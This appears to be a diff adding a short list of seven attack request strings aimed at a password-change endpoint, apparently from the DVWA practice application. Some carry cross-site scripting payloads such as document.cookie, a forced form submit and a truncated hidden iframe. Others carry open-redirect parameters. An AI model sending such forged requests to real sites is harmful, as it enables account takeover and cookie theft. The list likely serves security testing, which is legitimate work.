@@ -1,0 +1,13 @@
+?password_new=password&password_conf=password&Change=Change&payload=document.cookie
+
+?password_new=password&password_conf=password&Change=Change&payload=document.forms[0].submit()
+
+?password_new=password&password_conf=password&Change=Change&next=https://google.com
+
+?password_new=password&password_conf=password&Change=Change
+
+?password_new=password&password_conf=password&Change=Change&payload=<iframe%20style%3D"display%3Anone"
+
+?password_new=password&password_conf=password&Change=Change&redirect=https://google.com
+
+?password_new=password&password_conf=password&Change=Change&redirect-to?url=https://google.com
